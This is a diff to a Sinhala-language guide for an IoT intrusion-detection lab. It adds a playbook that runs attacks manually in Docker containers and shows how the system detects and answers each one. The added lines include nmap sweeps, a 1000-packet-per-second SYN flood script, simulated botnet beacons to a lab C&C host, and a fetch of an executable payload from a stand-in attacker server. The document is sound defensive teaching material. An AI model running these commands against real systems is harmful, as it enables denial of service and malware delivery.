@@ -36,7 +36,13 @@
      - 4.2.10 [පාලනය කළ Nmap Scan මඟින් උපාංග සෙවීම (Device Discovery - FR-05)](#4210-පාලනය-කළ-nmap-scan-මඟින්-අනුමත-උපාංග-සහ-සේවාවන්-හඳුනාගැනීම-controlled-nmap-device-discovery---fr-05--section-37)
      - 4.2.11 [Manual Block/Unblock & Filtered Log Export (FR-07, FR-08 & Scenario 6)](#4211-පරිපාලකයාට-manual-block-unblock-කිරීම-සහ-audit-logs-export-කිරීම-manual-blockunblock-audit-trail--filtered-export---fr-07-fr-08-scenario-6-objective-o5)
      - 4.2.12 [Machine Learning ආකෘතියේ පුහුණුව, නිරවද්‍යතාව සහ සජීවී වර්ගීකරණය තහවුරු කිරීම (ML Model Architecture, Training & Live Inference - FR-01, FR-02, Objective O2)](#4212-machine-learning-ආකෘතියේ-පුහුණුව-නිරවද්‍යතාව-සහ-සජීවී-වර්ගීකරණය-තහවුරු-කිරීම-ml-model-architecture-iot-23-training-zero-leakage-evaluation--live-inference-proof---objective-o2-table-6-table-7-fr-02-table-8-table-9)
-5. [සැබෑ උදාහරණ 2: සාමාන්‍ය අවස්ථාව සහ ප්‍රහාරක අවස්ථාව](#5-සැබෑ-උදාහරණ-2-සාමාන්‍ය-අවස්ථාව-සහ-ප්‍රහාරක-අවස්ථාව)
+   - 4.3 [විවිධ ප්‍රහාර වර්ග අතින් Commands ගසා සජීවීව පෙන්වීමේ ප්‍රායෝගික අත්පොත (Hands-On Manual Attack Execution, ML Detection, Firewall Response & Dashboard Telemetry Playbook)](#43-විවිධ-ප්‍රහාර-වර්ග-අතින්-commands-ගසා-සජීවීව-පෙන්වීමේ-ප්‍රායෝගික-අත්පොත-hands-on-manual-attack-execution-ml-detection-firewall-response--dashboard-telemetry-playbook)
+     - 4.3.1 [PortScan: Nmap Port Sweep (Table 10 Scenario 2)](#431-ප්‍රහාර-වර්ගය-1-portscan-reconnaissance---table-10-scenario-2)
+     - 4.3.2 [DDoS / DoS: SYN Flood & Router Rate-Limiting (Table 10 Scenario 3 & D-055)](#432-ප්‍රහාර-වර්ගය-2-ddos--dos-syn-flood-resource-exhaustion---table-10-scenario-3--rule-d-055)
+     - 4.3.3 [Command & Control (C&C): Botnet Beacons & Autonomous Block (Table 10 Scenario 4)](#433-ප්‍රහාර-වර්ගය-3-command--control-cc-botnet-beacons---table-10-scenario-4)
+     - 4.3.4 [Malware Download: Binary Payload Transfer & Forensic Alerts (Table 10 Scenario 5)](#434-ප්‍රහාර-වර්ගය-4-malware-download--suspicious-binary-transfer---table-10-scenario-5)
+     - 4.3.5 [Administrator Manual Block & Rollback (Table 10 Scenario 6)](#435-ප්‍රහාර-වර්ගය-5-administrator-manual-block--rollback---table-10-scenario-6)
+5. [සැබෑ උදාහරණ: සාමාන්‍ය අවස්ථාව සහ විවිධ ප්‍රහාරක අවස්ථා](#5-සැබෑ-උදාහරණ-සාමාන්‍ය-අවස්ථාව-සහ-විවිධ-ප්‍රහාරක-අවස්ථා)
 6. [Supervisor ඉදිරියේ Presentation එකක් කරන ආකාරය (Step-by-Step Script)](#6-supervisor-ඉදිරියේ-presentation-එකක්-කරන-ආකාරය-step-by-step-script)
 
 ---
@@ -644,10 +650,13 @@ Supervisor ඉදිරියේ පද්ධතිය පෙන්වන වි
 | **4.2.5: Router nftables Firewall**       | **O5** (Controlled Response & Allowlist)             | **FR-06 (Must)**: Firewall Rule Engine & **FR-07 (Must)**: Allowlist Safety | **RQ5** (Safety Rules preventing camera cut-off)                              | Firewall Invariant                                | Router එකේ immutable allowlist (Admin, NVR) සහ timed auto-expiry drop sets kernel මට්ටමේ ක්‍රියාත්මක බව.                               |
 | **4.2.6: Attacker Port Scan**             | **O6** (Attack Testing & Detection)                  | **FR-05** (Service Discovery Verification)                                        | **RQ2** (Scanning Class) & **Table 10 Scenario 2**                      | **Scenario 2** (Nmap Port Scan)             | පිටත Attacker Router එක හරහා කැමරාවේ Ports 80, 554 ක්ෂණිකව scan කරන බව (0.79s).                                                   |
 | **4.2.7: IDS Pipeline & Latency**         | **O2** (ML Detection) & **O6** (Speed/Latency) | **FR-02 (Must)**: Multi-class ML & **FR-03 (Must)**: DB Storage             | **RQ4** & **Table 9 Latency Target** (Median decision $< 2\text{ s}$) | Telemetry Baseline                                | Model v3.1.0 ධාවනය වන බවත්, සාමාන්‍ය තීරණ ගැනීමේ කාලය 112.15 ms ($< 2.0\text{ s}$) බවත් තහවුරු වීම.            |
+| **4.3.2: DDoS SYN Flood & Rate-Limit**     | **O5, O6** (Autonomous Rate-Limiting)               | **Table 5 & 10** (DDoS Mitigation) & Rule D-055                                          | **RQ4, RQ5** & **Table 10 Scenario 3**                                  | **Scenario 3** (DDoS SYN Flood)             | Attacker SYN Flood (1000 pkts/s) එල්ල කරන විට, Router එකෙන් Rate-Limit කර කැමරා සේවාව (NVR RTSP) සුරැකීම.    |
 | **4.2.8: C&C Autonomous Block**           | **O4, O5** (Automated Mitigation)                    | **FR-04 (Must)**: Live Socket.IO & **FR-06 (Must)**: Router Auto Block      | **RQ4** (End-to-End Time) & **Table 10 Scenario 4**                     | **Scenario 4** (C&C Botnet Beacons)         | C&C හඳුනාගත් සැණින් Router එකේ තත්පර 1800 කට block වී, තිරය refresh නොවී Dashboard Alert එක වැටීම.                    |
 | **4.2.9: Camera Stream Survival**         | **O5** (Safety Invariants)                           | Safety Guardrails & Access Protection                                                   | **Hypothesis H1** (FPR $\le 5\%$, Zero False Block) & **RQ5**         | **Scenario 4 / Table 9**                    | Attacker ව Block කළද කැමරාවේ සිට NVR එකට යන වීඩියෝවට බිංදු මාත්‍රයක හෝ බාධාවක් නොවීම (Safety Invariant). |
+| **4.3.4: Malware Download Evidence**      | **O3, O4** (Binary Transfer & Alerting)              | **Table 10 Row 5** & RULE_EXECUTABLE_DOWNLOAD                                           | **Table 10 Scenario 5** (Forensic Evidence)                             | **Scenario 5** (Malware Download)           | කැමරාව `.x86` binary එකක් බාගත කරන විට Zeek HTTP log එකෙන් අල්ලා Alert එකක් දී විද්‍යාත්මක සාක්ෂි රැස්කිරීම.  |
 | **4.2.10: Controlled Nmap Discovery**     | **O4** (Device Inventory & Storage)                  | **FR-05 (Should)**: Controlled Nmap Discovery & Services                          | **Section 3.7** (Device Inventory & Multi-evidence)                           | Inventory Audit                                   | පරිපාලකයාට ජාලයේ ඇති කැමරා සහ සේවාවන් Nmap මඟින් සොයාගෙන Dashboard හි Devices ලැයිස්තුවට දැමීම.   |
 | **4.2.11: Manual Block/Unblock & Export** | **O5** (Reversible Response) & **O4**          | **FR-07 (Must)**: Audit Log & **FR-08 (Should)**: Filtered Export           | **Table 10 Scenario 6** & **Table 9** (Usability & Audit)               | **Scenario 6** (Manual Block & Rollback)    | පරිපාලකයාට ඕනෑම IP එකක් Manual Block/Unblock කිරීමට සහ ප්‍රහාරක logs RFC 4180 CSV/JSON ලෙස Export කිරීම.             |
+| **4.3: Manual Attack Playbook**           | **O1–O6** (Comprehensive Hands-On Verification)      | End-to-End Manual Command Execution & Telemetry                                         | **Table 10 Scenarios 1–6 (Complete Hands-On)**                          | **Scenarios 1 to 6**                              | ටර්මිනලයේ අතින්ම commands ගසා (PortScan, DDoS, C&C, Malware, Manual Block) සියල්ල සජීවීව පෙන්වීමේ සම්පූර්ණ අත්පොත. |
 
 ---
 
@@ -1909,9 +1918,266 @@ SOC Dashboard එකේ වම්පස මෙනුවේ **"Devices & Scans"**
 
 ---
 
-# 5. සැබෑ උදාහරණ 2: සාමාන්‍ය අවස්ථාව සහ ප්‍රහාරක අවස්ථාව
+### 4.3 විවිධ ප්‍රහාර වර්ග අතින් Commands ගසා සජීවීව පෙන්වීමේ ප්‍රායෝගික අත්පොත (Hands-On Manual Attack Execution, ML Detection, Firewall Response & Dashboard Telemetry Playbook)
 
-### උදාහරණ A: සාමාන්‍ය වෙලාව (Normal Video Streaming)
+> 🎯 **මෙම අත්පොතේ අරමුණ (Purpose of this Playbook):**
+> කිසිදු ස්වයංක්‍රීය wrapper ස්ක්‍රිප්ට් එකක් පිටුපස සැඟවෙන්නේ නැතිව, අප පද්ධතිය හඳුනාගන්නා **සියලුම ප්‍රහාර වර්ග 5 (PortScan, DDoS SYN Flood, C&C Botnet Beacons, Malware Download, Manual Administrator Block)** සඳහා Terminal එකේ අතින්ම commands ගසා (`docker exec` මඟින්):
+> 1. **ප්‍රහාරක විධානය සජීවීව ධාවනය කිරීම (Direct Manual Attack Command)**
+> 2. **කේතයෙන් සහ ජාලයෙන් සිදුවන දේ සරලව තේරුම් ගැනීම (Under the Hood Execution)**
+> 3. **Zeek Sensor එකෙන් packets capture කර ලියන logs පරීක්ෂා කිරීම (Zeek Sniffing Proof)**
+> 4. **Random Forest AI Model එකෙන් (v3.1.0) අදාළ ප්‍රහාරක පන්තිය (Class & Confidence) හඳුනාගන්නා ආකාරය (ML Inference Proof)**
+> 5. **Router Firewall එකේ (Linux nftables) සජීවීව Block / Rate-Limit වන ආකාරය තහවුරු කිරීම (Firewall State Verification)**
+> 6. **React SOC Dashboard එකේ WebSocket හරහා screen එක refresh නොවී Live Alert එක සහ Mitigations පෙන්වන ආකාරය (Dashboard Telemetry)**
+> 7. **ප්‍රහාරය අවසන් වූ පසු Background Processes නැවැත්වීම (Cleanup Command)**
+> Supervisor ඉදිරියේ පියවරෙන් පියවර විද්‍යාත්මකව ඔප්පු කිරීමට අවශ්‍ය සියලු විධානයන් සහ පැහැදිලි කිරීම් පහත දැක්වේ.
+
+---
+
+#### 4.3.1 ප්‍රහාර වර්ගය 1: PortScan (Reconnaissance - Table 10 Scenario 2)
+
+- **ප්‍රහාරක අවස්ථාව සහ අරමුණ:** පිටත WAN ජාලයේ සිටින Attacker Laptop එක (`10.10.10.50`), Router එක හරහා කැමරා Subnet එකේ ඇති විවෘත Ports සෙවීමට Nmap TCP SYN scan එකක් එල්ල කරයි.
+- **1. Terminal එකේ අතින් ගසන Command එක (Manual Attack Command):**
+  - **ක්‍රමය A: තනි කැමරාවක Web (80) සහ RTSP Video (554) ports ඉලක්ක කර scan කිරීම (Targeted Probe - 0.79s):**
+    ```powershell
+    docker exec ids-lab-attacker nmap -p 80,554 192.168.50.30
+    ```
+  - **ක්‍රමය B: Proposal Table 10 Scenario 2 අනුව මුළු Subnet එකම sweep කිරීම (Subnet Reconnaissance):**
+    ```powershell
+    docker exec ids-lab-attacker nmap -p 23,80,554 192.168.50.0/24
+    ```
+
+- **2. කේතයෙන් සිදුවන දේ සරලව (Under the Hood):**
+  Attacker container එක (`ids-lab-attacker`) පිටත ජාලයේ සිට Router එක (`10.10.10.1`) හරහා `192.168.50.0/24` subnet එකේ IP ලිපින 254 ටම Ports 23 (Telnet), 80 (HTTP), සහ 554 (RTSP) වෙත TCP SYN packets විදිනු ලබයි. කැමරාවේ Ports 80 සහ 554 විවෘත බව තත්පර 0.79 කදී හඳුනාගනී.
+
+- **3. Zeek Sensor එක Capture කරන හැටි (Zeek Sniffing Proof):**
+  Zeek sensor එක Router එක සහ Switch එක අතර promiscuous mode එකෙන් අසමින් සිටින බැවින්, මෙම scans සියල්ල capture කර `conn.log` හි ලියයි:
+  ```powershell
+  Get-Content lab_virtual\zeek_logs\conn.log -Tail 5
+  ```
+  - **ලැබෙන log සටහන:** `id.orig_h: "10.10.10.50"`, `id.resp_h: "192.168.50.30"`, `id.resp_p: 80`, `conn_state: "S0"`, `history: "S"`.
+
+- **4. ML Model (v3.1.0) හඳුනාගන්නා ආකාරය (ML Inference):**
+  - Feature Extractor එක මඟින් කෙටි කාලයක් තුළ එකම Host එකකින් වෙනස් destination ports/IPs වෙත ගිය flows ගණන (`pair_flow_count_1m`, `pair_distinct_dst_ports_10m`) ගණනය කරයි.
+  - Random Forest Classifier (v3.1.0) මෙය **`PortScan`** ප්‍රහාරක පන්තිය ලෙස වර්ගීකරණය කරයි.
+
+- **5. Router Firewall සහ Safety Guardrails (Firewall State):**
+  - කැමරා වීඩියෝවට කිසිදු බාධාවක් නොවේ (Hypothesis H1).
+  - Port Scan එල්ල කළ Attacker IP එක අධීක්ෂණයට ලක්වන අතර, සීමාව ඉක්මවුවහොත් Router එකේ `block_src` ලැයිස්තුවට Drop rule එක වැටේ.
+  ```powershell
+  docker exec ids-lab-router nft list set inet ids block_src
+  ```
+
+- **6. 🖥️ Dashboard එකෙන් සජීවීව පෙනෙන ආකාරය (`http://localhost:5000/alerts`):**
+  - තිරය refresh නොවී WebSocket මඟින් ක්ෂණිකව තැඹිලි පැහැති අනතුරු ඇඟවීමේ Badge එකක් වැටේ:
+    - **Classification:** `PortScan (Reconnaissance)`
+    - **Source IP:** `10.10.10.50` (Attacker)
+    - **Target IP:** `192.168.50.30` (Camera)
+    - **Observed Ports:** `80, 554`
+    - **Action:** `Reconnaissance Observed`
+
+- **7. Cleanup:** Nmap ස්කෑන් එක අවසන් වූ සැණින් තනිවම නවතින බැවින් අමතර process cleanup අවශ්‍ය නොවේ.
+
+---
+
+#### 4.3.2 ප්‍රහාර වර්ගය 2: DDoS / DoS SYN Flood (Resource Exhaustion - Table 10 Scenario 3 & Rule D-055)
+
+- **ප්‍රහාරක අවස්ථාව සහ අරමුණ:** Attacker Laptop එක පිටත ජාලයේ සිට කැමරාවේ Web Server එක (Port 80) වෙත අධික වේගයෙන් TCP SYN packets ගංවතුරක් (SYN Flood) එල්ල කර කැමරාවේ සම්පත් අඩපණ කිරීමට උත්සාහ කරයි (Proposal Table 10 Row 3).
+- **1. Terminal එකේ අතින් ගසන Command එක (Manual Attack Command):**
+  ```powershell
+  docker exec ids-lab-attack-server python -u /lab/syn_flood.py 192.168.50.30 --port 80 --rate 1000 --seconds 20
+  ```
+
+- **2. කේතයෙන් සිදුවන දේ සරලව (Under the Hood):**
+  `syn_flood.py` ස්ක්‍රිප්ටුව Linux raw sockets භාවිතා කර, පිටත Attacker IP එකෙන් (`10.10.10.50`) කැමරාවේ IP එක (`192.168.50.30:80`) වෙත **තත්පරයට TCP SYN packets 1,000 බැගින් තත්පර 20 ක් පුරා (මුළු packets 20,000 ක්)** එක දිගටම විදියි. මෙහි අරමුණ වන්නේ කැමරාවේ TCP SYN Backlog Queue එක පිරවීමයි.
+
+- **3. Zeek Sensor එක Capture කරන හැටි (Zeek Sniffing Proof):**
+  Zeek sensor එක මෙම දැවැන්ත packet ප්‍රවාහය ක්ෂණිකව සටහන් කරගනී:
+  ```powershell
+  Get-Content lab_virtual\zeek_logs\conn.log -Tail 5
+  ```
+  - **ලැබෙන log සටහන:** `conn_state: "S0"` (සම්බන්ධතාවය අවසන් නොවූ අර්ධ SYN තත්ත්වය), `orig_pkts` අගය තත්පරයෙන් තත්පරය සිය ගණනින් ඉහළ යයි, `resp_bytes: 0` (කැමරාවට පිළිතුරු දීමට නොහැකි තරම් flood එකක්).
+
+- **4. ML Model (v3.1.0) සහ Mitigation Rule (D-055):**
+  - Features 27 අතුරින් `flow_duration`, `orig_pkts`, `orig_ip_bytes`, සහ packet rate features විශ්ලේෂණය කර, Model v3.1.0 මඟින් මෙය **`DDoS_DoS`** ලෙස වර්ගීකරණය කරයි ($P \ge 0.85$).
+  - Proposal Table 5, Table 10 සහ Supervisor අනුමත **Rule D-055** අනුව: පිටතින් එන මෙම අධික flood source එක Router මට්ටමින් **Rate-Limit (වේගය සීමා කිරීම)** හෝ Drop කිරීමට Decision Engine එක තීරණය කරයි.
+
+- **5. Router Firewall ක්‍රියාත්මක වීම සහ කැමරා සේවාව සුරැකීම (Safety Verification):**
+  - Router එකේ Linux `nftables` මඟින් `10.10.10.50` වෙතින් එන packets වේගය සීමා කරන බැවින්, කැමරාවේ CPU සහ Socket buffers නිදහස් වේ!
+  - **කැමරාවේ RTSP Video Stream එක (Port 554) NVR එක වෙත කිසිදු බාධාවකින් තොරව ගලායන බව සනාථ කිරීමට:**
+    ```powershell
+    docker exec ids-lab-nvr python -c "import socket; s=socket.create_connection(('192.168.50.30', 554), timeout=3); print('NVR Video Stream: HEALTHY & ACTIVE')"
+    ```
+    *(ප්‍රතිඵලය: `NVR Video Stream: HEALTHY & ACTIVE` ලෙස තිරයේ දිස්වේ).*
+
+- **6. 🖥️ Dashboard එකෙන් සජීවීව පෙනෙන ආකාරය (`http://localhost:5000/alerts`):**
+  - **Live Alerts:** රතු පැහැති High-Priority Alert එකක් වැටේ:
+    - **Classification:** `DDoS_DoS (SYN Flood)`
+    - **Source IP:** `10.10.10.50` -> **Target:** `192.168.50.30:80`
+    - **Action:** `Rate-Limited / Autonomous Mitigation Enforced`
+  - **Mitigations පිටුව (`http://localhost:5000/mitigations`):** පිටත Attacker IP ලිපිනය Rate-Limit/Filter ලැයිස්තුවට ඇතුළත් වූ බව සජීවීව පෙන්වයි.
+
+- **7. Cleanup:** තත්පර 20 කින් ස්ක්‍රිප්ට් එක තනිවම අවසන් වේ. ඊට පෙර බලහත්කාරයෙන් නැවැත්වීමට අවශ්‍ය නම්:
+  ```powershell
+  docker exec ids-lab-attack-server pkill -f "syn_flood.py"
+  ```
+
+---
+
+#### 4.3.3 ප්‍රහාර වර්ගය 3: Command & Control (C&C Botnet Beacons - Table 10 Scenario 4)
+
+- **ප්‍රහාරක අවස්ථාව සහ අරමුණ:** ආසාදිත කැමරාවක් (Compromised IoT Camera) පිටත WAN ජාලයේ ඇති Attacker C&C Master Server එක (`10.10.10.50:6667`) වෙත periodic outbound botnet beacons යවමින් ඊළඟ ප්‍රහාරක විධානය ඉල්ලයි (Proposal Table 10 Row 4).
+- **1. Terminal එකේ අතින් ගසන Commands (Manual Attack Commands):**
+  ```powershell
+  # පියවර 1: පිටත Attacker මැෂිමේ Port 6667 C&C Master Server එක Background එකේ ක්‍රියාත්මක කිරීම:
+  docker exec -d ids-lab-attack-server python -u /lab/lab_server.py --role cnc --cnc-open-after 120
+
+  # පියවර 2: ආසාදිත කැමරාව තුළින් පිටත C&C Server එක වෙත Botnet Beacons යැවීම ආරම්භ කිරීම:
+  docker exec -d ids-lab-camera python -u /lab/camera_sim.py bot --server 10.10.10.50 --every 5 --session 30 --duration 90
+  ```
+
+- **2. කේතයෙන් සිදුවන දේ සරලව (Under the Hood):**
+  - Attacker Server එක (`10.10.10.50`) Port 6667 (IRC/Botnet Port) සක්‍රිය කරයි (මුල් තත්පර 120 තුළ closed තබා පසුව විවෘත වේ - IoT-23 Malware හැසිරීම අනුකරණය කිරීමට).
+  - ආසාදිත කැමරාව (`192.168.50.30`) සෑම තත්පර 5 කට වරක්ම (`--every 5`) පිටත C&C Server එක අමතමින් "I am alive, send commands" යනුවෙන් Keep-Alive Reverse Shell සම්බන්ධතා ගොඩනැගීමට උත්සාහ කරයි.
+
+- **3. Zeek Sensor එක Capture කරන හැටි (Zeek Sniffing Proof):**
+  ```powershell
+  Get-Content lab_virtual\zeek_logs\conn.log -Tail 5
+  ```
+  - **ලැබෙන log සටහන:** `id.orig_h: "192.168.50.30"`, `id.resp_h: "10.10.10.50"`, `id.resp_p: 6667`, `conn_state: "REJ"`, `history: "Sr"`.
+
+- **4. ML Model (v3.1.0) හඳුනාගන්නා ආකාරය (ML Inference):**
+  - Feature Extractor එක මඟින් `pair_fail_1h = 7` (පැය තුළ අසාර්ථක වූ outbound සම්බන්ධතා), `conn_state = REJ`, සහ `resp_p = 6667` ග්‍රහණය කරගනී.
+  - Random Forest Model v3.1.0 මඟින් මෙය **`CnC`** (Command & Control) ප්‍රහාරයක් බව **91.2% ක ඉහළ Confidence** එකකින් අනාවරණය කරයි.
+
+- **5. Router Firewall ස්වයංක්‍රීයව Block කිරීම (Autonomous Firewall Proof):**
+  - Decision Engine එක කැමරාව Allowlist හි ඇති බව තහවුරු කරගෙන කැමරාව කිසිසේත්ම block නොකරයි.
+  - SSH හරහා Router එකට විධානයක් යවා, පිටත ඇති C&C Server IP එක (`10.10.10.50`) Router එකේ `block_dst` ලැයිස්තුවට **තත්පර 1800 ක (මිනිත්තු 30) Countdown Timer** එකක් සමඟ ඇතුළත් කරයි:
+  ```powershell
+  docker exec ids-lab-router nft list set inet ids block_dst
+  ```
+  - **ලැබෙන පිළිතුර (Linux Kernel State):**
+    ```text
+    table inet ids {
+        set block_dst {
+            type ipv4_addr
+            flags timeout
+            elements = { 10.10.10.50 timeout 30m expires 29m54s }
+        }
+    }
+    ```
+
+- **6. 🖥️ Dashboard එකෙන් සජීවීව පෙනෙන ආකාරය:**
+  - **Live Alerts (`http://localhost:5000/alerts`):** තිරය refresh නොවී WebSocket හරහා රතු පැහැති C&C Incident Badge එකක් දිස්වේ.
+  - **Mitigations පිටුව (`http://localhost:5000/mitigations`):** Active Blocks වගුවේ `10.10.10.50` (Destination) ලිපිනය වැටී, තත්පරයෙන් තත්පරය Auto-Expiry Countdown එක ක්‍රියාත්මක වේ.
+  - **NVR වීඩියෝවට Zero Impact:** කැමරාව සහ NVR අතර Local RTSP Stream එක කිසිදු බාධාවකින් තොරව අඛණ්ඩව ධාවනය වේ (Hypothesis H1 Target).
+
+- **7. Cleanup Commands (ප්‍රහාරය අවසන් කිරීම):**
+  ```powershell
+  docker exec ids-lab-attack-server pkill -f "lab_server.py --role cnc"
+  docker exec ids-lab-camera pkill -f "camera_sim.py bot"
+  ```
+
+---
+
+#### 4.3.4 ප්‍රහාර වර්ගය 4: Malware Download / Suspicious Binary Transfer (Table 10 Scenario 5)
+
+- **ප්‍රහාරක අවස්ථාව සහ අරමුණ:** ආසාදිත කැමරාව පිටත Attacker Web Server එකෙන් (`10.10.10.50`) නපුරු Executable Payload එකක් (`lab_test.x86` - Linux ELF Binary එකක්) Download කරගැනීමට උත්සාහ කරයි (Proposal Table 10 Row 5).
+- **1. Terminal එකේ අතින් ගසන Command එක (Manual Attack Command):**
+  ```powershell
+  docker exec ids-lab-camera python -u /lab/camera_sim.py download --url http://10.10.10.50/bins/lab_test.x86 --count 5 --every 20
+  ```
+
+- **2. කේතයෙන් සිදුවන දේ සරලව (Under the Hood):**
+  කැමරාව (`192.168.50.30`) තුළින් පිටත Attacker Server එකේ (`10.10.10.50:80`) ඇති `/bins/lab_test.x86` ලිපිනය වෙත HTTP GET Requests 5 ක් තත්පර 20 ක පරතරයකින් යවා, එම executable binary payload එක බාගත කරයි.
+
+- **3. Zeek Sensor එක Capture කරන හැටි (Zeek Sniffing Proof):**
+  Zeek HTTP Analyzer එක මෙම ගොනු හුවමාරුව සවිස්තරාත්මකව `http.log` හි වාර්තා කරයි:
+  ```powershell
+  Get-Content lab_virtual\zeek_logs\http.log -Tail 3
+  ```
+  - **ලැබෙන log සටහන:** `uri: "/bins/lab_test.x86"`, `method: "GET"`, `status_code: 200`, `resp_mime_types: ["application/x-executable"]`.
+
+- **4. ML Model සහ Signature Rule ක්‍රියාත්මක වීම:**
+  - **`RULE_EXECUTABLE_DOWNLOAD`** නීතිය සක්‍රිය වී binary file extension (`.x86`) සහ ELF Magic Headers හඳුනාගනී.
+  - Random Forest Classifier එක මඟින් **`Malware_Download`** අනතුරු ඇඟවීමක් ජනනය කරයි.
+
+- **5. Router ප්‍රතිචාරය (Proposal Policy):**
+  - Proposal Table 10 Row 5 හි දක්වා ඇති පරිදි: *"alert and evidence only; no block"*.
+  - කැමරා Firmware Updates වැනි නීත්‍යානුකූල binary downloads වැළැක්වීම වැළැක්වීමට මෙහිදී ස්වයංක්‍රීය block එකක් ක්‍රියාත්මක නොවන අතර, අධිකරණමය සාක්ෂි (Forensic Evidence) MongoDB හි සටහන් කර පරිපාලකයාට තීරණය ගැනීමට ඉඩ හරියි.
+
+- **6. 🖥️ Dashboard එකෙන් සජීවීව පෙනෙන ආකාරය (`http://localhost:5000/alerts`):**
+  - Live Alerts පිටුවේ කහ පැහැති අනතුරු ඇඟවීමේ Badge එකක් වැටේ:
+    - **Classification:** `Malware_Download (Executable Payload)`
+    - **Source IP:** `10.10.10.50` -> **Destination:** `192.168.50.30`
+    - **Evidence File:** `/bins/lab_test.x86`
+    - **Action:** `Forensic Alert Logged (Review Required)`
+
+- **7. Cleanup:** බාගත කිරීම් 5 අවසන් වූ පසු ස්ක්‍රිප්ටුව තනිවම අවසන් වේ.
+
+---
+
+#### 4.3.5 ප්‍රහාර වර්ගය 5: Administrator Manual Block & Rollback (Table 10 Scenario 6)
+
+- **ප්‍රහාරක අවස්ථාව සහ අරමුණ:** පරිපාලකයා විසින් Dashboard UI හෝ REST API එක හරහා ඕනෑම ප්‍රහාරක හෝ අනවසර IP එකක් ක්ෂණිකව Manual Block කිරීම සහ නැවත එය Unblock (Rollback) කිරීම (Proposal Table 10 Row 6 & FR-07, FR-08).
+- **1. Terminal එකේ අතින් Manual Block කරන Command එක:**
+  ```powershell
+  python -c "
+  import urllib.request, json
+  with open('lab_virtual/keys/dashboard_login.txt') as f:
+      u, p = f.read().strip().split()[:2]
+  req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+  tok = json.loads(urllib.request.urlopen(req).read())['token']
+  req_block = urllib.request.Request('http://127.0.0.1:5000/api/blocklist', data=json.dumps({'ip':'10.10.10.50','direction':'source','duration_minutes':10,'reason':'Manual Supervisor Demo Block'}).encode(), headers={'Content-Type':'application/json','Authorization':'Bearer '+tok})
+  res = urllib.request.urlopen(req_block)
+  print('Manual Block Response:', res.getcode(), json.loads(res.read()))
+  "
+  ```
+
+- **2. Router Firewall එකේ සජීවීව Block එක පරීක්ෂා කිරීම (Kernel Proof):**
+  ```powershell
+  docker exec ids-lab-router nft list set inet ids block_src
+  ```
+  - **ලැබෙන පිළිතුර:** `10.10.10.50` ලිපිනය router එකේ `block_src` ලැයිස්තුවට මිනිත්තු 10 ක timeout එකක් සමඟ ඇතුළත් වී ඇත.
+
+- **3. Terminal එකේ අතින් Manual Unblock (Rollback) කරන Command එක:**
+  ```powershell
+  python -c "
+  import urllib.request, json
+  with open('lab_virtual/keys/dashboard_login.txt') as f:
+      u, p = f.read().strip().split()[:2]
+  req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+  tok = json.loads(urllib.request.urlopen(req).read())['token']
+  req_unblock = urllib.request.Request('http://127.0.0.1:5000/api/blocklist/10.10.10.50', data=json.dumps({'reason':'Manual Rollback Done'}).encode(), headers={'Content-Type':'application/json','Authorization':'Bearer '+tok}, method='DELETE')
+  res = urllib.request.urlopen(req_unblock)
+  print('Manual Unblock Response:', res.getcode(), json.loads(res.read()))
+  "
+  ```
+
+- **4. Audit Trail එක තහවුරු කිරීම (Proposal FR-07 Audit Compliance):**
+  පරිපාලකයා කළ Block සහ Unblock ක්‍රියාවන් දෙකම System Audit Log එකේ නිවැරදිව සටහන් වූ බව පෙන්වීම:
+  ```powershell
+  python -c "
+  import urllib.request, json
+  with open('lab_virtual/keys/dashboard_login.txt') as f:
+      u, p = f.read().strip().split()[:2]
+  req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+  tok = json.loads(urllib.request.urlopen(req).read())['token']
+  req_audit = urllib.request.Request('http://127.0.0.1:5000/api/v1/audit/logs?limit=2', headers={'Authorization':'Bearer '+tok})
+  print(json.dumps(json.loads(urllib.request.urlopen(req_audit).read()), indent=2))
+  "
+  ```
+
+- **5. 🖥️ Dashboard එකෙන් සජීවීව පෙනෙන ආකාරය:**
+  - `http://localhost:5000/mitigations`: Block කළ සැණින් IP එක active blocks වගුවට වැටී, Unblock කළ සැණින් වගුවෙන් ඉවත් වේ.
+  - `http://localhost:5000/audit`: පරිපාලකයාගේ නම (`labadmin`), ක්‍රියාව (`manual_block`, `manual_unblock`), හේතුව, සහ වේලාව දැක්වෙන වෙනස් කළ නොහැකි audit සටහනක් දිස්වේ.
+
+---
+
+# 5. සැබෑ උදාහරණ: සාමාන්‍ය අවස්ථාව සහ විවිධ ප්‍රහාරක අවස්ථා (End-to-End Data Chain In Action)
+
+පද්ධතිය තුළ විවිධ ජාල තත්ත්වයන් යටතේ දත්ත ගලායන සම්පූර්ණ දාමය (Packets ➔ Zeek ➔ Feature Extractor ➔ ML Model ➔ Decision Engine ➔ Router Firewall ➔ Dashboard) පහත සැබෑ අවස්ථා මඟින් පැහැදිලි වේ:
+
+### උදාහරණ A: සාමාන්‍ය වෙලාව (Normal Video Streaming - Scenario 1)
 
 1. NVR (`192.168.50.20`) කැමරාවෙන් (`192.168.50.30:554`) වීඩියෝ ඉල්ලයි.
 2. කැමරාව තත්පර 300 ක් පුරා **55.91 MB** ක වීඩියෝ packets යවයි.
@@ -1923,7 +2189,31 @@ SOC Dashboard එකේ වම්පස මෙනුවේ **"Devices & Scans"**
 
 ---
 
-### උදාහරණ B: C&C ප්‍රහාරයක් එල්ල වන වෙලාව (Scenario 4)
+### උදාහරණ B: Reconnaissance PortScan ප්‍රහාරයක් එල්ල වන වෙලාව (Scenario 2)
+
+1. Attacker (`10.10.10.50`) කැමරාවේ විවෘත ports සෙවීමට Nmap scan එකක් එල්ල කරයි.
+2. Router එක හරහා TCP SYN packets ගමන් කර කැමරාවේ Ports 80, 554 හඳුනාගනී.
+3. Zeek ලියයි: `conn_state: "S0"`, කෙටි කාලයකදී වෙනස් ports/IPs කිහිපයක්.
+4. Adapter එක features 27 ක් හදයි: `pair_flow_count_1m = 18`, `pair_distinct_dst_ports_10m = 3`.
+5. Model v3.1.0 එක කියයි: `predicted_class = "PortScan"`, `confidence = 0.88`.
+6. Decision Engine: Reconnaissance ලෙස හඳුනාගෙන Dashboard එකට alert එකක් යවයි (කැමරාව සුරක්ෂිතව පවතී).
